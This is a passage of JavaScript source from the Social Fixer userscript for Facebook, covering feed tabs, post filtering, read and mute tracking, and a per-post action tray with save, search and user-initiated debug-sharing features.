							if (tab_id==home_tab_id) {
								add_style(
									'#content .bfb_show_all .bfb_read.'+tab_id+':not(sfx.tabbed),'+
									'#content .bfb_show_all .bfb_hidden.'+tab_id+':not(sfx.tabbed),'+
									'#timeline_tab_content .bfb_show_all .bfb_read.'+tab_id+':not(sfx.tabbed),'+
									'#timeline_tab_content .bfb_show_all .bfb_hidden.'+tab_id+':not(sfx.tabbed),'+
									'	{ display:block !important; opacity:.5 !important; }'
								,'sfx_tab_controller');
							}
							else {
								var prefix = '.'+container_class+' ~ ul > ';
								add_style(
									prefix+' .bfb_processed:not(.'+tab_id+') { display:none !important; }'+
									prefix+' .'+tab_id+'{display:block !important;}'+
									prefix+' .'+tab_id+'.bfb_read, '+
									prefix+' .'+tab_id+'.bfb_read ~ .spinePointer '+
									'	{ display:none !important; }'+
									prefix+' .'+tab_id+'.bfb_new_comments, '+
									prefix+' .'+tab_id+'.bfb_new_comments .bfb_new_comment_notif, '+
									prefix+' .'+tab_id+'.bfb_new_comments ~ .spinePointer '+
									'	{ display:block !important; }'+
									prefix+' .'+tab_id+'.bfb_hidden,'+
									prefix+' .'+tab_id+'.bfb_hidden ~ .spinePointer, '+
									prefix+' .'+tab_id+'.bfb_duplicate'+
									'	{ display:none !important; }'+
									'#globalContainer .bfb_show_all .bfb_read.'+tab_id+','+
									'#globalContainer .bfb_show_all .bfb_hidden.'+tab_id+
									'	{ display:block !important; background-color:#f6f6f6 !important; }'
								,'sfx_tab_controller');
							}							
						}
						// When the page changes, clear out the tab styles
						on_page_change(function() {
							add_style('','sfx_tab_controller');
						});
						// Keep track of the exact tab container inserted, so we can reference it in CSS rules that are bound only to that tab container.
						// This is so when the page re-paints and the tabs are gone, the styles previously inserted can be ignored.
						var container_index = 0; 
						var container_class = '';
						var containerListenerAdded = false;
						function addTabContainer() {
							var hs = getStream();
							if (hs) {
								++container_index;
								container_class = 'bfb_tab_container_'+container_index;
								var c = el('div','bfb_tabs '+container_class,{id:'bfb_feed_tabs'});
								insertBefore( c, hs);
								insertBefore( el('div','bfb_clear'), hs );
								// Attach a click handler for tabs
								if (!containerListenerAdded) {
									containerListenerAdded = true;
									bind(document,'click',function(e) {
										var new_tab = getParentByClass(target(e),'bfb_tab');
										if (!new_tab) { return; }
										var tab_id = new_tab.id;
										if (tab_id==previous_tab_id) { return; } // Same tab clicked
										// Unselect previous tab
										var previous_tab = QS(".bfb_tab_selected");
										if (previous_tab) { removeClass(previous_tab,"bfb_tab_selected"); }
										// Select new tab
										addClass(new_tab, "bfb_tab_selected");
										addTabControllerStyles(tab_id,container_class);
										previous_tab_id = tab_id;
									});
								}
								return c;
							}
							return null;
						}
						function getTabId(name) {
							return "sfx_tab_"+(name.replace(/[^a-zA-Z0-9_]/g,""));
						}
						function addTab(name,add_close_icon,close_func) {
							var tab_id = getTabId(name);
							var tab = $(tab_id);
							if (tab==null) { // Make sure the tab doesn't already exist
								var container = $('bfb_feed_tabs');
								// If there is no tab container, and the first tab we are adding is not Home, then first add Home!
								if (!container) {
									if (name!=home_tab) {
										addTab(home_tab);
										addTabControllerStyles(home_tab_id);
										container = $('bfb_feed_tabs');
									}
									else {
										container = addTabContainer();
									}
								}
								if (container) {
									var selected = (container.getElementsByTagName('div').length==0);
									tab = el('div','bfb_tab '+(selected?"bfb_tab_selected":""),{id:tab_id},null,'<span class="name">'+name+"</span>");
									if (add_close_icon) {
										append(tab,el('div','bfb_tab_close',{title:"Remove this application from auto-tabbing. Posts from this app will return to the Home tab."},{click:close_func}));
									}
									var counter_id = tab_id+"_count";
									append(tab, el('span','bfb_tab_count',{id:counter_id}) );
									append(container, tab );

									return tab;
								}
								return null;
							}
							return tab;
						}
						function getTabClass(cn) {
							return match(cn,/(sfx_tab_\S+)/);
						}
						function moveToTab(name,o) {
							var ret = "";
							var t = addTab(name);
							if (t) {
								var tab_id = t.id;
								if (name!=home_tab) { 
									addClass(o,"sfx_tabbed");
									addClass(o,tab_id);
								}
							}
							else {
								return "Tab does not exist after addTab()!";
							}
							return "";
						}

						var show_tab_count = options.get('tab_count');
						var tabCountTimers = {};
						function getPostList(tab_id) {
							if (!tab_id) { 
								tab_id = previous_tab_id;
							}
							if (tab_id==null || tab_id==home_tab_id) {
								return QSA('.bfb_processed:not(.sfx_tabbed)');
							}
							else {
								return QSA('.bfb_processed.'+tab_id);
							}
						}
						function update_tab_count(tab_id) { 
							if (!show_tab_count) { return; }
							var total=0,c=0;
							if (typeof tab_id=="object") { // Passed an element reference (post)
								tab_id=getTabClass(tab_id.className);
								if (!tab_id) {
									tab_id=home_tab_id;
								}
							}
							if (!tab_id) { return; }

							setTimeout(function(){
								// Try to only update tab counts if it's not in rapid succession
								if (typeof tabCountTimers[tab_id]!="undefined") {
									clearTimeout(tabCountTimers[tab_id]);
								}
								tabCountTimers[tab_id] = setTimeout( function() { 
									var post_list = getPostList(tab_id), L=0;
									if (post_list) {
										L=post_list.length;
									} 
									for (var i=0; i<L; i++) {
										var o = post_list[i];
										if (!hasClass(o,"bfb_duplicate") && !hasClass(o,'sfx_trending_articles') && !hasClass(o,'UIRecentActivity_Stream')) {
											total++;
											if (!hasClass(o,'bfb_hidden') && !hasClass(o,'sfx_trending_articles')&& !hasClass(o,'sfx_sponsored') && (!hasClass(o,'bfb_read') || hasClass(o,'bfb_new_comments'))) {
												c++;
											}
										}
									}
									html( $(tab_id+"_count"), '<span class="paren">(</span><span class="new">'+c+'</span>/<span class="total">'+total+'</span><span class="paren">)</span>' );
									// Change classes depending on if there are any posts in the tab
									if (c==0) { addClass($(tab_id),"bfb_tab_empty"); } else { removeClass($(tab_id),"bfb_tab_empty"); }

									delete tabCountTimers[tab_id];
								}, 200 );
							},100) ;
						};
				
						// ==================================================================
						// POST PROCESSING
						// ==================================================================
						function hideStory(o) {
							while (o && o.parentNode) {
								if (matchesSelector(o, storySelector )) {
									removeClass(o,"bfb_new_comments");
									return;
								}
								o = o.parentNode;
							}
						}
						function getData(o,container) {
							var data = o.getAttribute(container);
							if (data) {
								var attrs = parse(data,"getDataProperty");

								return attrs;
							}
							return {};
						}
						function getDataProperty(o,prop,container) {
							return getData(o,container)[prop];
						}
						function getStoryProperty(o,prop) { return getDataProperty(o,prop,'data-ft'); }

						// Read in the custom apps and add them
						var custom_apps = trim(options.get('custom_apps'));
						if (custom_apps && custom_apps.length>0) {
							custom_apps = custom_apps.split(/\s*,\s*/);
							if (custom_apps && custom_apps.length>0) {
								for (var i=0; i<custom_apps.length; i++) {
									var props = custom_apps[i].split(':');
									apps[''+props[0]] = props[1];
									}
							}
						}

						var auto_mute_count = options.get('auto_mute_count');
						var auto_mute_all = options.get('auto_mute_all');
						var filters = options.get('filters');
						var reorder = options.get('reorder');
						var reorder_tabbed = options.get('reorder_tabbed');
						var always_show_tabs = options.get('always_show_tabs');
						var tab_all_apps = options.get('tab_all_apps');
						var expand_similar_posts = options.get('expand_similar_posts');
						var show_post_actions = options.get('show_post_actions');
						var processProfiles = options.get('process_profiles');
						var processGroups = options.get('process_groups');
						var dontHidePostsOnProfiles = options.get('dont_hide_posts_on_profiles');
						var filterProfiles = options.get('filter_profiles');
						var filters_enabled = options.get('filters_enabled');
						var display_control_panel = options.get('display_control_panel');
						var open_app_link_in_tab = options.get('open_app_link_in_tab');
						var open_app_link_marks_read = options.get('open_app_link_marks_read');
						var auto_expand_comments = options.get('auto_expand_comments');
						var expand_see_more = options.get('expand_see_more');
						var allow_bfb_formatting = options.get('allow_bfb_formatting');
						var untabs = options.get('untab_apps');
						var untabs_array = untabs.split(","); 
						var untabs_hash = {};
						var hide_trending = options.get('hide_trending_articles');
						var hide_sponsored = options.get('hide_sponsored');
						var hide_duplicates = options.get('hide_duplicates');
						
						for (var ui=0; ui<untabs_array.length; ui++) {
							if (untabs_array[ui]) { untabs_hash[untabs_array[ui]] = true; }
						}
						
						function addAllTabs(o) {
							addTab(home_tab);
							if (filters && filters.length) {
								for (i=0; i<filters.length; i++) {
									filter = filters[i];
									if (!filter.disabled && filter.actions && typeof filter.actions.move_to_tab!="undefined" && filter.actions.move_to_tab.indexOf("<")!=0) {
										addTab(filter.actions.move_to_tab);
									}
								}
							}
							tabs_added = true;
						}
						function tabs_exist() { return !!$('bfb_feed_tabs'); }
						
						var no_sty_error_shown = false;

						function fixStory(o,isPageOrProfile,isGroupWall) {
							var href = "";
							try { href = window.location.href; } catch(e) { } 
							
							// If viewing a single wall post, don't process anything!
							if (href.indexOf("story_fbid=")>0 || href.indexOf("share_id=")>0) { return; }

							// Don't pocess the post if it isn't in a stream!
							if (parent(o,'.uiContextualDialogContent')) { return; }

							if (filters_enabled && always_show_tabs && !tabs_exist() && !isPageOrProfile) {
								addAllTabs(o);
							}

							// Create the control panel if it's not already there
							if (display_control_panel) {
								var cp = $('better_fb_cp');
								if (cp==null) { 
									var hs = QS(document,'#home_stream,#profile_stream_container,#profile_minifeed,#pagelet_group,.fbTimelineComposerCapsule');
									if (hs!=null) {
										createControlPanel(hs);
									}
									else {
										createControlPanel(o.parentNode);
									}
								} else {
									cp.style.display="block"; 
								} 
							}

							// Check to see if this post has already been processed
							if (hasClass(o,'bfb_processed')) {
								return; 
							}
							addClass(o,'bfb_processed');
							update_status('bfb_status_processed',++count_processed);

							// Check to see if this is a "Trending ..." container
							if (hide_trending) {
								var trending = QS(o,'.ogStaticPagerHeader,.ogStaticSlidePagerUserHeader,.ogSliderAnimPageHeader,.ogSliderAnimPager,.ogAggregationTrendingList');
								if (trending) {
									addClass(o,"sfx_trending_articles");
								}
							}

							// Check to see if this is a "Sponsored Story" container
							if (hide_sponsored) {
								var sponsored = QS(o,'.uiStreamAdditionalLogging a[href*="/sponsored-stories"], .uiStreamAdditionalLogging a[href*="/ads"]');
								if (sponsored) {
									addClass(o,"sfx_sponsored");
								}
							}
							
							// Get the story properties from the data-ft attribute
							var props = getData(o,"data-ft");
							if (!props || !props.sty) {
								// Try to get the story type from the innerhtml
								var sty = match(o.innerHTML,/story_type=(\d+)/);
								if (sty) {
									props.sty = sty;
								}
							}
							var type = props.sty || -1;
							
							// If there is no fbid, then we can't uniquely identify this post. We're screwed.
							var fbid = getFbid(o,props);
							if (!fbid || fbid==0) {
								addClass(o,"nofbid");
								return;
							}
				//			insertFirst(o,el('div',null,null,null,fbid,{'backgroundColor':'#ddd'}));

							// Lookup the app_id if it doesn't exist
							var app_debug = "";
							if (!props.app_id) {
								try {
									var app_id = null;
									QS(o,'.uiStreamSource a[data-appname]',function(o) {
										app_debug += "data-appname found. ";
										try { app_id=o.href.match(/id=(\d+)/)[1]; } catch(e) { app_debug+="Exception: "+e.description+": "+o.href+". "; }
									});
									if (!app_id) {
										QS(o,'.uiStreamSource a[data-hovercard]',function(o) {
											app_debug += "data-hovercard found. ";
											try { 
												app_id = o.getAttribute('data-hovercard').match(/page.php\?id=(\d+)/)[1];
											} catch(e) { app_debug+="Exception: "+e.description+": "+o.getAttribute('data-hovercard')+". "; }
											if (!app_id) {
												try { 
													app_id = o.getAttribute('data-hovercard').match(/application.php\?id=(\d+)/)[1];
												} catch(e) { app_debug+="Exception: "+e.description+": "+o.getAttribute('data-hovercard')+". "; }
											}
										});
									}
									if (!app_id) {
										QS(o,'.uiStreamSource a[data-hovercardx]',function(o) {
											app_debug += "data-hovercardx found. ";
											try { 
												app_id = o.getAttribute('data-hovercardx').match(/page.php\?id=(\d+)/)[1]; 
											} catch(e) { app_debug+="Exception: "+e.description+": "+o.getAttribute('data-hovercardx')+". "; }
											if (!app_id) {
												try { 
													app_id = o.getAttribute('data-hovercardx').match(/application.php\?id=(\d+)/)[1];
												} catch(e) { app_debug+="Exception: "+e.description+": "+o.getAttribute('data-hovercardx')+". "; }
											}
										});
									}
									if (!app_id) {
										QSA(o,"a[href*=application\\.php\\?id\\=]",function(a) {
											app_debug += "application.php found. ";
											try { app_id = match(a.href,/id=(\d+)/); } catch(e) { app_debug+="Exception: "+e.description+": "+a.href+". "; }
										});
									}
									if (!app_id) {
										try { app_id = match(o.innerHTML,/app=(\d+)/); } catch(e) { app_debug+="Exception: "+e.description+". "; }
									}
									if (!app_id) {
										try { app_id = match(o.innerHTML,/appid=(\d+)/); } catch(e) { app_debug+="Exception: "+e.description+". "; }
									}
									if (app_id) {
										props.app_id = app_id;
									}
								}
								catch (e) { add_exception(e); }
							}
							if (!props.app_id) {
								app_debug += "No app_id found. ";
							}
							else {
								app_debug += "app_id="+props.app_id;
							}
							post_debug(fbid,"<b>app_id debug: </b>"+app_debug);
							
							// Handle duplicate stories
							if (hide_duplicates && fbid) {
								var actrs_temp = props.actrs || 'na';
								var dupe_id = fbid+"/"+actrs_temp;
								if (QS(document,'*[sfx_dupe_id="'+dupe_id+'"]')) {
									addClass(o,"bfb_duplicate");
									update_status('bfb_status_duplicate',++count_duplicate);
									return;
								}
								o.setAttribute('sfx_dupe_id',dupe_id)
							}

							o.setAttribute('fbid',fbid);
							o.setAttribute('comment_count', get_post_comment_count(o));

							// Enhance links in application stories
							if (props.app_id && (open_app_link_in_tab || open_app_link_marks_read) && o.querySelectorAll) {
								var links = o.querySelectorAll("a[href*=\\:\\/\\/apps\\.facebook]");
								for (var i=0; i<links.length; i++) {
									if (open_app_link_in_tab) {
										links[i].target="_blank";
									}
									if (open_app_link_marks_read) {
										bind(links[i],'click',function() { mark_post_read(o,true); });
									}
								}
							}
							
							// Apply filter rules
							var fdebug = "";
							var show_add_app_icon = (typeof props.app_id!="undefined");
							var tabbed = false;
							var filtered = false;
							var hidden = false;
							if (filters_enabled && (!isPageOrProfile || filterProfiles)) {
								var i, filter, fmatch, dataft_key, criteria, rule, action;
								var stop_processing = false;
								var inner_text = null;
								var get_inner_text = function() {
									QSA(o,'.actorName,.messageBody,.statusUnit,.uiStreamAttachments,.uiStreamFooter,.uiStreamMessage',function(o) { inner_text += " " + innerText(o); });
									if (!inner_text) {
										inner_text = innerText(o);
									}
									QS(o,'.uiStreamPrivacy i',function(i) {
										var cn = i.className;
										inner_text += " "+cn;
										if (/sx_c5ead8/.test(cn)) { inner_text += " privacy:public "; }
										else if (/sx_9ba59a/.test(cn)) { inner_text += " privacy:friends "; }
										else if (/sx_e661b3/.test(cn)) { inner_text += " privacy:custom "; }
									});
									fdebug += '<div style="border:1px solid #999;">'+inner_text+'</div>';
								};
								if (filters && filters.length) {
									for (i=0; i<filters.length; i++) {
										filter = filters[i];
										if (filter.disabled) { continue; }
										fmatch = true;
										var ignore_filter = false;

										// Check to see if the filter uses sty type, and show an error if so
										for (dataft_key in filter.criteria) {
											if (dataft_key=="sty") {
												if (!no_sty_error_shown) {
													no_sty_error_shown = true;
													//add_error("SFX Error: Filters based on story type have been removed, because Facebook no longer provides the data necessary to process them correctly. Open Options and save your filters to remove this message.");
												}
												ignore_filter = true; break;
											}
										}
										if (!ignore_filter) {
											for (dataft_key in filter.criteria) {
												criteria = filter.criteria[dataft_key];
												if (dataft_key=="regex") {
													if (inner_text==null) {
														get_inner_text();
													}
													if (typeof criteria=="string" && criteria.indexOf("/")==0) {
														// This is regular expression text, so convert it!
														var converted_criteria = convert_string_to_regex(criteria);
														if (converted_criteria==null) {
															add_error("The regular expression used in a filter ("+criteria+") is invalid, so the filter was ignored");
															fmatch = false; break;
														}
														else {
															criteria = converted_criteria;
														}
													}
													if (typeof criteria=="string") {
														if (!o || !inner_text || inner_text.toLowerCase().indexOf(criteria.toLowerCase())==-1) {
															fmatch = false; break;
														}
													}
													else if (criteria && criteria.test) {
														if (!criteria.test(inner_text)) {
															fmatch = false; break;	
														}
													}
													else {
														fmatch = false; break;
													}
												}
												else if (dataft_key=="selector") {
													if (!QS(o,criteria)) {
														fmatch = false; break;
													}
												}
												// Special case for app "Pages" to be treated as the app itself
												else if (dataft_key=="app_id") {
													if ( !(props['app_id'] && (props['app_id'] in criteria)) && !(props['actrs'] && (props['actrs'] in criteria)) ) {
														fmatch = false; break;
													}
												}
												else if (!props[dataft_key] || !(props[dataft_key] in criteria)) {
													if (dataft_key=='actrs' && !props['actrs']) { // Check to see if actrs are defined in class name
														if (!o.className || !o.className.match(/aid_\d+/)) { 
															fmatch = false;
														}
														else {
															var aid_num = 0;
															match(o.className,/aid_\d+/g,function(aid) {
																if (aid_num++>0) { return; }
																if (!(aid.substring(4) in criteria)) { fmatch=false; }
															});
														}
														if (!fmatch){break;}
													}
													else {
														fmatch = false; 
														break;
													}
												}
											}
											if (fmatch && filter.actions) {
												fdebug+="Matched filter #"+i+". ";
												filtered = true;
												for (action in filter.actions) {
													if (action=="move_to_tab") {
														// Check for special handlers in tab names
														var tabname = filter.actions[action];
														var app_id = props['app_id'];
														if (tabname=="<app_name>") {
															if (app_id && typeof apps[app_id]!="undefined") { tabname = apps[app_id]; }
															else { tabname = "Unknown App"; }
														}
														fdebug+='Moving to tab ['+tabname+'].';
														fdebug += moveToTab(tabname,o);
														tabbed = true;
														show_add_app_icon = false;
													}
													else if (action=="add_class") { addClass(o,filter.actions[action]); }
													else if (action=="hide") { addClass(o,"bfb_hidden"); hidden = true; }
													else if (action=="minimize") { addClass(o,"bfb_minimized"); }
												}
												if (filter.stop) {
													stop_processing = true;
													break;
												}
											}
										}
									}
								}
								// check if we need to move all app posts
								if (!tabbed && tab_all_apps) {
									if (props.app_id || (props.actrs && typeof apps[props.actrs]!="undefined" )) {
										var app_id = props.app_id;
										if (!app_id) {
											app_id = props.actrs;
										}
										if ( (app_id in apps) && !(untabs_hash[app_id])) {
											addTab(apps[app_id],true,function(x) {
												if (confirm("This will cause posts from "+apps[app_id]+" to no longer be in their own tab. The page will refresh to re-filter after this change. Are you sure you want to stop "+apps[app_id]+" posts from being automatically tabbed?")) {
													untabs += (untabs==""?"":",")+app_id;
													options.set('untab_apps',untabs,true,function() {
														try { alert('This app will not be tabbed the next time the feed is loaded'); } catch(e){}
													});
												}
											});
											fdebug += moveToTab(apps[app_id],o);
											tabbed = true;
											show_add_app_icon = false;
										}
									}
								}
							}
							else {
								fdebug+="Filtering disabled";
							}
							if (tabbed) { 
								update_status('bfb_status_tabbed',++count_tabbed); 
							} 
							if (filtered) { update_status('bfb_status_filtered',++count_filtered); }

							// Auto-expand the comments
							if (auto_expand_comments) {
								var comment_link = o.querySelector('.commentable_item');
								if (comment_link && o.querySelector('.feedbackBling')) {
									removeClass(comment_link,'collapsed_comments');
									removeClass(comment_link,'hidden_add_comment');
								}
							}
							
							// If there is a grouping of similar posts, click it!
							if (expand_similar_posts) {
								QS(o,'.'+streamCollapsedClass+' a ', function(similar) {
					//				similar.style.backgroundColor = "yellow";
					//				html( similar, "<strong>AUTO-EXPANDING...</strong>"+similar.innerHTML );
									try {
										clickLinkQueued(similar);
					//					update_status('bfb_status_expanded',++count_expanded);
									} catch (e) { add_error("Failed on clickLinkQueued! Please report this error!"+e.toString()); }
								});
							}

							// Get the stored data for this post
							var post_data = options.get('story_data.'+fbid);
							if (!post_data) {
								post_data = {};
								post_debug(fbid,'<br>No post data found for this post. It has not been seen before. If this post keeps coming back after marking it as read or muted, see <a href="http://SocialFixer.com/faq.php#fbid">this FAQ entry</a> for an explanation and fix.<br><br>');
							}
							
							// Check to see if it's already been marked as read
							if (post_data.read && (!isPageOrProfile || !dontHidePostsOnProfiles)) {
								addClass(o,"bfb_read");
								hidden = true;
							}
							
							// Check to see if it has new comments
							var c = get_comment_container(o);
							var count = get_post_comment_count(o);
							
							// This is tricky. Store the number of comment childNodes of the comment container.
							// If the post has "view all X comments", and you add one, the comment counting code will still see that same number because it's not updated.
							// So we stored the childNode length and compare it later when marking as read. Yuck!
							// cnc = childNodeCount
							post_data.cnc = 0;
							if (c) { post_data.cnc = (QS(c,comment_selector)||[]).length; }

							// But not if the user has disabled following of comments
							var new_comments_exist = false;
							if (count>0) {
								if (post_data.read && (auto_mute_all || post_data.no_comments || (auto_mute_count>0 && count>auto_mute_count))) {
									addClass(o,"bfb_muted");
								}
								else {
									var t = time();
									var stored_count = 0;
									if (post_data.cc && typeof post_data.cc.c!="undefined") {
										stored_count = post_data.cc.c
									}
									if (post_data.read && (+count > +stored_count)) {
										addClass(o,"bfb_new_comments");
										hidden = false;
										// Add a new box into the comment area?
										if (!QS(o,'.bfb_new_comment_notif')) {
											var new_count = count-stored_count;
											var text = new_count+" new comment"+((new_count>1)?"s":"") + " ("+count+" total)";
											var section = el('div','ufi_section bfb_new_comment_notif');
											html(section,text);
											new_comments_exist = true;
											// Add the notification
											if (c) {
												insertFirst(c,section);
											}
											else {
												var container = QS(o,'.UFIContainer .UFIList,.uiStreamFooter');
												insertFirst(container,section);
											}
										}
									}
								}
							}
							var filter = props.filter || '';

							update_tab_count(o);
							
							if (hidden) { update_status('bfb_status_hidden',++count_hidden); }

							// Add the post action tray
							if (show_post_actions) {
								var mark_post_unread = function(o,fbid,a) {
									delete post_data.read;
									delete post_data.cc;
									options.set('story_data.'+fbid,post_data);
									removeClass(o,"bfb_read");
									removeClass(o,"bfb_new_comments");
									update_tab_count(o);
									a.parentNode.removeChild(a);
								}

								o.style.position="relative";
								var pcp = ['<div class="bfb_post_action_container_inner">'];
								if (options.get('show_post_action_info_mark_read')) {
									var mark_read_desc = "Mark Read: Mark this post as read and hide it until/unless new comments are posted";
									if (post_data.read) {
										mark_read_desc = "Mark Read: Update the stored comment count for this post, mark it as read, and hide it again.";
									}
									pcp.push('		<div class="bfb_post_action bfb_post_action_read" title="'+mark_read_desc+'">&nbsp;</div> ');
								}
								if (options.get('show_post_action_info_mute')) {
									var mute_desc = "Mute Comments: mute this post so new comments will not be shown.";
									if (!new_comments_exist) {
										mute_desc = "Mark Read and Mute: Mark this post as read and mute any future comments";
									}
									pcp.push('<div class="bfb_post_action bfb_post_action_mute" title="'+mute_desc+'">&nbsp;</div>');
								}
								if (options.get('show_post_action_mark_unread')) {
									pcp.push('<div class="bfb_post_action bfb_post_action_unread" title="Mark Unread: mark this post as unread so it shows up in your feed again.">&nbsp;</div>');
								}
								if (options.get('show_post_action_info_add_app')) {
									if (show_add_app_icon) {
										pcp.push('<div class="bfb_post_action bfb_post_action_add" title="Add App: add this application to your list of known apps. (It will then be automatically tabbed by name if that feature is enabled).">&nbsp;</div>');
									}
								}
								if (options.get('show_post_action_save')) {
									pcp.push('<div class="bfb_post_action bfb_post_action_save" title="Save for Later">&nbsp;</div>');		
								}
								if (options.get('show_post_action_google')) {
									pcp.push('<div class="bfb_post_action bfb_post_action_google" title="Google It!">&nbsp;</div>');		
								}
								if (options.get('show_post_action_info')) {
									pcp.push('<div class="bfb_post_action bfb_post_action_info" title="Post Info: View debug information about this post and how it was processed. Useful for debugging or reporting problems!">&nbsp;</div>');
								}
								
								pcp.push('</div>');
								var d = el('div','bfb_post_action_container',null,null,pcp.join(''));
								bind(QS(d,'.bfb_post_action_save'),'click',function(e) {
									// Find the url to save
									var url = null, title='Saved from Facebook', alt_url=null, alt_title='Saved from Facebook';
									QS(o,'.uiAttachmentTitle a',function(a) {
										url = a.href;
										title = a.innerHTML;
									});
									// Find the link to the post itself
									QS(o,'.uiStreamSource a, .timelineTimestamp a.uiLinkSubtle',function(a) {
										alt_url = a.href;
										QS(o,'.messageBody,.text_exposed_root',function(body) {
											alt_title = innerText(body);
										});
										if (alt_title && alt_title.length>80) {
											alt_title = alt_title.substring(0,80);
										}
									});
									// If a linked url wasn't found, use the post url
									if (!url && alt_url) {
										url = alt_url; 
										title = alt_title;
									}
									if (url) {
										var container = el('div','sfx_dialog_save_later');
										var header = el('div','sfx_dialog_save_later_header',null,null,'Save To Pocket');
										append(header,el('a','sfx_dialog_save_later_header_link',{href:"http://SocialFixer.com/faq.php#pocket",target:"_blank"},null,'(What is this?)',{color:"white","cssFloat":"right","fontSize":"11px"}));
										append(container,header);
										var i = el('iframe','sfx_dialog_save_later_body',{"src":'https://getpocket.com/save?url='+url+'&title='+title});
										append(container,i); 
										var footer = el('div','sfx_dialog_save_later_footer',null,{click:function(){;i.src=null;removeChild(container);}},'<center><label class="uiButton UIButton UIButton_Blue UIFormButton UIButton_better_fb"><input type="button" value="Close"></label></center>');
										// If there is an alt url, give the option to use it instead
										if (url!=alt_url) {
											var alt = el('div','sfx_dialog_save_later_alt',null,null,'Save FB post instead');
											click(alt,function() {
												i.src = 'https://getpocket.com/save?url='+alt_url+'&title='+alt_title;
												removeChild(alt);
											});
											insertFirst(footer,alt);
										}
										append(container,footer);
										append(body(),container);
				//						window.open('https://getpocket.com/save?url='+url+'&title='+title,'SocialFixerSaver','height=500&width=500');
									}
								});
								bind( $first(d,'bfb_post_action_add'),'click',function(e) {
									try {
										var appname = null;
										if (o.querySelector) {
											// This is the old way of identifying an application. Left here just in case it comes back.
											var applinks = o.querySelectorAll("a[href*=application\\.php\\?id\\=]");
											for (var j=0; j<applinks.length; j++) {
												if (applinks[j].getElementsByTagName("IMG").length==0) {
													appname = applinks[j].innerHTML.replace(/[,:'"\<\>\&\*\@\$]/g,'');
												}
											}
											if (!appname) {
												QS(o,'.uiStreamSource a[data-appname]',function(a) {
													appname = a.getAttribute('data-appname');
												});
											}
											if (!appname) {
												appname = prompt("What would you like to label this application? (This is also the name of the tab where it will appear if you have the option set to automatically send known apps to tabs)","");
											}
											if (appname) {
												if (custom_apps.length>0) { custom_apps+="," };
												custom_apps += props.app_id+':'+appname;
												options.set('custom_apps',custom_apps,false);
												apps[props.app_id] = appname;
												// Remove it from the untabs list, if it's there
												untabs_hash[props.app_id] = false;
												untabs = untabs.replace( new RegExp(props.app_id+",?"), '');
												options.set('untab_apps',untabs,false);
												options.save( function() { alert('saved'); });
												moveToTab(apps[props.app_id],o);
											}
										}
									}
									catch(e) { }
								} );
								bind( $first(d,'bfb_post_action_mute'),'click',function(e) { mute_post(o,true); } );
								bind( $first(d,'bfb_post_action_read'),'click',function(e) { mark_post_read(o,true); } );
								bind( $first(d,'bfb_post_action_unread'),'click',function(e) { mark_post_unread(o,fbid,target(e)); } );
								bind( $first(d,'bfb_post_action_info'),'click',function(e) { 
									toggleClass(o,'post_debug');
									// If the debug info isn't already there, populate it
									var db = QS(o,'.bfb_debug');
									if (!db) {
										post_debug(fbid, '<b>HTML:</b><br><div style="border:1px solid green;max-height:100px;overflow:auto;">'+htmlescape(o.innerHTML)+'</div>');
										db = el('div','bfb_debug');
										append(o,db);
									}
									var debug_text = get_post_debug(fbid);
									html( db, debug_text );
									QS(db,'.bfb_debug_share',function(span) {
										bind(span,'click',function() {	
											var debug_form = QS(document,'bfb_debug_form');
											if (!debug_form) {
												debug_form = el('form',null,{id:'bfb_debug_form',method:'POST',action:'http://pastehtml.com/upload/create?input_type=html&result=address',target:'_blank'},null,'<input type="hidden" name="txt">');
												append( QS(document,'body'), debug_form );
											}
											QS(debug_form,'input').value = '<!-- SFX:'+version+' / Browser:'+unsafeWindow.navigator.userAgent+' -->'+debug_text;//.replace(/\<br\>/g,"\n").replace(/\<\/?[bu]\>/g,"").replace(/\&gt;/g,">").replace(/\&lt;/g,"<").replace(/\&quot;/g,"\"");
											var msg = "A new window or tab will now open with a url. Paste that url into a post, comment, or email to share the full debug info!";
											if (protocol=="https:") {
												msg += "\n\n(NOTE: You may get a warning about an unencrypted connection. You can safely ignore this warning. Only the debug info below is being sent.)";
											}
											alert(msg);
											debug_form.submit();
										});
									});
								} );
								bind( $first(d,'bfb_post_action_google'),'click',function(e) { google_it(o); } );
								
								// If this post has the "audience" selector, shift the post actions to the left
								if (QS(o,'.audienceSelector')) {
									d.style.marginRight = "24px";
								}
								insertFirst(o,d);
							}
							
							// Add debug info to the story
							var c = _template("<b>fbid</b>=%1%, <b>type=%2% (%6%)</b>, <b>post_data</b>=%3%, <b># Comments found</b>=%5%, <b>className</b>='%4%'",fbid,type,JSON.stringify(post_data), o.className, count, story_types[type]);
							var dataft = o.getAttribute('data-ft');
							if (dataft) { c+="<br><b>data-ft</b>:"+ dataft.replace(/,/g,", "); }
							if (fdebug) { c+="<br><b>Filter Debug:</b>"+fdebug; }
							post_debug(fbid,c);
							

						}
						
						var post_debug_info = {};
						function post_debug(fbid,str) {
							post_debug_info[fbid] = (post_debug_info[fbid]||"") + str + "<br>";
						}
						function get_post_debug(fbid) {
							var debug = '<b><u>Social Fixer Post Debug Info</u></b> - <span class="bfb_debug_share" style="cursor:pointer;text-decoration:underline;color:#cc0000;font-weight:bold;">Click Here To Send To Support!</span><br>';
							debug += post_debug_info[fbid]+"<br>";
							// Output some settings
							debug += "<b>Options:</b><br>";
							var opts = ['version','always_show_tabs','tab_all_apps','filters_enabled','custom_apps','untab_apps','filter_profiles'];
							for (var i=0; i<opts.length; i++) {
								debug += opts[i]+":"+(options.get(opts[i]))+"<br>";
							}
							// Generate a summary of filters
							var filters = options.get('filters');
							if (filters) {
								debug += "<br><b>Filters:</b><pre>";
								filters.forEach(function(filter,i) {
									debug += "Filter #"+i+": "+JSON.stringify(filters[i],null,0)+"<br>";
								});
								debug += "</pre>";
							}
							// Peek at the HTML/BODY tags
							debug += "<br><b>Other:</b><br>";
							debug += '&lt;html class="'+QS(document,'html','className')+'"&gt;<br>&lt;body class="'+QS(document,'body','className')+'"&gt;';
							return debug;
						}

						function google_it(o) {
							var q = QS(o,'.messageBody','innerHTML');
							if (!q) { q = QS(o,'.UIStory_Message','innerHTML'); }
							if (!q) { q = QS(o,'.uiStreamMessage','innerHTML'); }
							if (q) {
								// Clean up the source
								q = q.replace(/^\s*<span.*?<\/span>/," ");
								q = q.replace(/<.*?>/g," ");
								q = q.replace(/[^\w\d\s\_\-\.]/g,' ');
								q = q.replace(/\s+/g,' ');
								q = trim(q);
								q = q.replace(/ /g,"+");
								window.open("http://google.com/search?q="+q);
							}
							else {
								alert("Couldn't find post message content, sorry!");
							}
						}

						// Get the container where comments are stored
						function get_comment_container(o) {
